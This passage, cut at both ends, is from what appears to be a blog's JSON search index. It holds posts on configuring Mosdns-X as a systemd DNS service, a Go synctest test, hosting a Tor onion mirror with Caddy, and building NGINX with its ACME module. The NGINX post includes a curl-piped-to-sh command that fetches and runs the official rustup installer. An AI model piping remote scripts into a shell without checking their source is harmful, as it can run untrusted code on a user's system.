style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eservers:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e  - exec: main\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e    listeners:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      - addr: :53\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        protocol: udp\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e      - addr: :53\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e        protocol: tcp\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"systemd\"\u003esystemd\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo tee /etc/systemd/system/mosdns.service \u0026gt; /dev/null \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;\u0026#39;EOF\u0026#39;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[Unit]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eDescription=Mosdns-X DNS Accelerator\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eAfter=network.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[Service]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eType=simple\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eUser=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eGroup=root\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eExecStart=/usr/local/bin/mosdns-x start --as-service -d /usr/local/bin -c /etc/mosdns-x/config.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eRestart=always\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eRestartSec=5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eStandardOutput=journal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eStandardError=journal\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eSyslogIdentifier=mosdns\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e[Install]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eWantedBy=multi-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl daemon-reload\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl enable --now mosdns\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 备份系统 DNS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo cp -n /etc/resolv.conf /etc/resolv.conf.mosdns-backup\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 改为使用本地 Mosdns-X\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nameserver 127.0.0.1\\noptions edns0\u0026#34;\u003c/span\u003e | sudo tee /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若 53 端口被 systemd-resolved 占用，可禁用它\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl disable --now systemd-resolved 2\u0026gt;/dev/null \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 如果想顺便加锁（防止被 DHCP 修改），加上 chattr 一起执行：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;nameserver 127.0.0.1\\n\u0026#34;\u003c/span\u003e \u0026gt; /etc/resolv.conf \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e chattr +i /etc/resolv.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看进程状态\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl status mosdns --no-pager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 测试解析速度（第二次命中缓存更快）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edig +stats www.google.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edig +stats www.baidu.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 查看实时日志\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etail -f /var/log/mosdns-x/mosdns-x.log\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","DNS","linux"],"title":"Mosdns-X"},{"categories":["URL","Go","sync","test"],"contents":" go-synctest func TestAfterFunc(t *testing.T) { synctest.Test(t, func(*testing.T) { ctx, cancel := context.WithCancel(context.Background()) called := false context.AfterFunc(ctx, func() { called = true }) synctest.Wait() // 等到所有 goroutine 都卡住 if called { t.Fatal(\u0026#34;AfterFunc 在 cancel 前就被呼叫\u0026#34;) } cancel() synctest.Wait() // 再等一次 if !called { t.Fatal(\u0026#34;AfterFunc 沒有在 cancel 後被呼叫\u0026#34;) } }) } ","date":"November 7, 2025","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20251107-go-synctest/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ganhua.wang/go-synctest\" target=\"_blank\" rel=\"noopener\"\u003ego-synctest\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestAfterFunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003esynctest\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTest\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etesting\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eT\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ecancel\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithCancel\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBackground\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAfterFunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003esynctest\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e() \u003cspan style=\"color:#75715e\"\u003e// 等到所有 goroutine 都卡住\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AfterFunc 在 cancel 前就被呼叫\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003ecancel\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003esynctest\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWait\u003c/span\u003e() \u003cspan style=\"color:#75715e\"\u003e// 再等一次\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e !\u003cspan style=\"color:#a6e22e\"\u003ecalled\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFatal\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AfterFunc 沒有在 cancel 後被呼叫\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","sync","test"],"title":"go-synctest"},{"categories":["URL","Tor"],"contents":" onion-mirror Install Tor sudo apt update sudo apt install tor Configure Tor # Disable SOCKS proxy since we aren\u0026#39;t making outbound connections # through Tor SocksPort 0 # Make sure Tor runs as a daemon (i.e. in the background) RunAsDaemon 1 # Setup the hidden service on port 80, this is where we tell Tor to # create a .onion service for our web server HiddenServiceDir /var/lib/tor/hidden_service/ HiddenServicePort 80 # Disable inbound connections, since we aren\u0026#39;t running a relay or # exit node ORPort 0 # Disable directory services, since we won\u0026#39;t be mirroring directory # information to other Tor nodes DirPort 0 sudo systemctl restart tor Get Your .onion Address sudo cat /var/lib/tor/hidden_service/hostname Configure Caddy http://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion:80 { # Set up a reverse proxy, or serve static files, etc. } Advertise Your .onion Address header { Onion-Location http://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion{uri} } ","date":"October 30, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20251030-onion-mirror/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://flower.codes/2025/10/23/onion-mirror.html\" target=\"_blank\" rel=\"noopener\"\u003eonion-mirror\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"install-tor\"\u003eInstall Tor\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install tor\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"configure-tor\"\u003eConfigure Tor\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# Disable SOCKS proxy since we aren\u0026#39;t making outbound connections\n# through Tor\nSocksPort 0\n\n# Make sure Tor runs as a daemon (i.e. in the background)\nRunAsDaemon 1\n\n# Setup the hidden service on port 80, this is where we tell Tor to\n# create a .onion service for our web server\nHiddenServiceDir /var/lib/tor/hidden_service/\nHiddenServicePort 80\n\n# Disable inbound connections, since we aren\u0026#39;t running a relay or\n# exit node\nORPort 0\n\n# Disable directory services, since we won\u0026#39;t be mirroring directory\n# information to other Tor nodes\nDirPort 0\n\u003c/code\u003e\u003c/pre\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo systemctl restart tor\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"get-your-onion-address\"\u003eGet Your .onion Address\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo cat /var/lib/tor/hidden_service/hostname\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"configure-caddy\"\u003eConfigure Caddy\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttp://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion:80 {\n  # Set up a reverse proxy, or serve static files, etc.\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"advertise-your-onion-address\"\u003eAdvertise Your .onion Address\u003c/h3\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eheader {\n  Onion-Location http://jytkco7clxwj4hhzaydhk4kr3hwzsdzyvtsc6zn2ivog5uma5pxowzad.onion{uri}\n}\n\u003c/code\u003e\u003c/pre\u003e","tags":["URL","Tor"],"title":"onion-mirror"},{"categories":["URL","NGINX","ACME","module"],"contents":" NGINX 原生 ACME 支持：从根本上重塑 TLS 自动化部署 ngx_http_acme_module NGINX 1.25.1 pre-install # 在 Debian/Ubuntu 系统上安装基础编译工具和 NGINX 依赖 sudo apt update sudo apt install build-essential libpcre3-dev zlib1g-dev libssl-dev pkg-config libclang-dev git -y # 安装 Rust 工具链 (cargo 和 rustc) curl --proto \u0026#39;=https\u0026#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh source $HOME/.cargo/env mkdir -pv /app/nginx/{logs,conf,cache, acme} /app/nginx-build cd /app/nginx-build # 克隆 ACME 模块的源码 git clone https://github.com/nginx/nginx-acme.git /app/nginx-build/nginx-acme # 或者 # git clone git@github.com:nginx/nginx-acme.git /app/nginx-build/nginx-acme # 下载 NGINX 源码（请替换为您需要的版本） wget https://nginx.org/download/nginx-1.28.0.tar.gz tar -zxf nginx-1.28.0.tar.gz compile cd nginx-1.28.0 ./configure \\ --prefix=/app/nginx \\ --error-log-path=/app/nginx/error.log \\ --http-log-path=/app/nginx/access.log \\ --pid-path=/app/nginx/nginx.pid \\ --lock-path=/app/nginx/nginx.lock \\ --http-client-body-temp-path=/app/nginx/cache/client_temp \\ --http-proxy-temp-path=/app/nginx/cache/proxy_temp \\ --http-fastcgi-temp-path=/app/nginx/cache/fastcgi_temp \\ --http-uwsgi-temp-path=/app/nginx/cache/uwsgi_temp \\ --http-scgi-temp-path=/app/nginx/cache/scgi_temp \\ --user=nginx \\ --group=nginx \\ --with-compat \\ --with-file-aio \\ --with-threads \\ --with-http_addition_module \\ --with-http_auth_request_module \\ --with-http_dav_module \\ --with-http_flv_module \\ --with-http_gunzip_module \\ --with-http_gzip_static_module \\ --with-http_mp4_module \\ --with-http_random_index_module \\ --with-http_realip_module \\ --with-http_secure_link_module \\ --with-http_slice_module \\ --with-http_ssl_module \\ --with-http_stub_status_module \\ --with-http_sub_module \\ --with-http_v2_module \\ --with-http_v3_module \\ --with-mail \\ --with-mail_ssl_module \\ --with-stream \\ --with-stream_realip_module \\ --with-stream_ssl_module \\ --with-stream_ssl_preread_module \\ --with-cc-opt=\u0026#39;-g -O2 -ffile-prefix-map=/home/builder/debuild/nginx-1.28.0/debian/debuild-base/nginx-1.28.0=. -fstack-protector-strong -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC\u0026#39; \\ --with-ld-opt=\u0026#39;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie\u0026#39; \\ --add-dynamic-module=/app/nginx-build/nginx-acme make \u0026amp;\u0026amp; \\ make modules \u0026amp;\u0026amp; \\ make install # 运行配置脚本，这里的关键是 --add-dynamic-module # 注意：您需要在这里包含您当前 NGINX 已有的所有编译参数，可以通过 nginx -V 查看 # 编译模块，注意是 make modules 而不是 make install config # /app/nginx/conf/nginx.conf user nginx; error_log error.log debug; pid nginx.pid; load_module modules/ngx_http_acme_module.so; events { worker_connections 1024; multi_accept on; } http { include mime.types; default_type application/octet-stream; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$host\u0026#34; \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; access_log access.log main; sendfile on; tcp_nopush on; charset utf-8; keepalive_timeout 65; gzip on; resolver 8.8.8.8 1.1.1.1; # 定义一个名为 letsencrypt 的 ACME 颁发机构实例 acme_issuer letsencrypt { # 指定 ACME 服务提供商的目录 URL，这里是 Let\u0026#39;s Encrypt 的生产环境 uri https://acme-v02.api.letsencrypt.org/directory; # 提供一个联系邮箱，用于接收 CA 的重要通知（如证书即将过期） contact mailto:security-alerts@aidig.co; # 指定状态文件的存储路径，用于保存 ACME 账户密钥，非常重要 state_path acme/letsencrypt; # 同意服务条款，对于 Let\u0026#39;s Encrypt 等 CA 这是必需的步骤 accept_terms_of_service; } # 可选指令 acme_shared_zone，用于存储所有配置的证书颁发者的证书、私钥和挑战数据。该区域默认大小为 256K，可根据需要增加 acme_shared_zone zone=acme_shared:1M; server { listen 443 ssl; server_name ssl.aidig.co; # 步骤一：声明此 server 块启用 ACME，并指定使用上面定义的 letsencrypt 颁发机构 acme_certificate letsencrypt; # 步骤二：使用动态变量加载由 ACME 模块在内存中管理的证书和私钥 ssl_certificate $acme_certificate; ssl_certificate_key $acme_certificate_key; ssl_certificate_cache max=2; # required ngx 1.27.4+ location / { default_type text/plain; return 200 \u0026#39;OK\u0026#39;; } } server { listen 80 default_server; server_name _; # ACME 模块会自动处理 /.well-known/acme-challenge/ 的请求，此 location 用于处理所有其他请求 location / { return 301 https://$host$request_uri; } } } ","date":"October 20, 2025","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20251020-nginx-acme-module/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sconts.com/post/nginx-native-acme-support/\" target=\"_blank\" rel=\"noopener\"\u003eNGINX 原生 ACME 支持：从根本上重塑 TLS 自动化部署\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ngx_http_acme_module\"\u003e\u003ccode\u003engx_http_acme_module\u003c/code\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eNGINX 1.25.1\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"pre-install\"\u003epre-install\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 在 Debian/Ubuntu 系统上安装基础编译工具和 NGINX 依赖\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo apt install build-essential libpcre3-dev zlib1g-dev libssl-dev pkg-config libclang-dev git -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安装 Rust 工具链 (cargo 和 rustc)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl --proto \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;=https\u0026#39;\u003c/span\u003e --tlsv1.2 -sSf https://sh.rustup.rs | sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esource $HOME/.cargo/env\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir -pv /app/nginx/\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003elogs,conf,cache, acme\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e /app/nginx-build\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd /app/nginx-build\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 克隆 ACME 模块的源码\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/nginx/nginx-acme.git /app/nginx-build/nginx-acme\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 或者\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# git clone git@github.com:nginx/nginx-acme.git /app/nginx-build/nginx-acme\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 下载 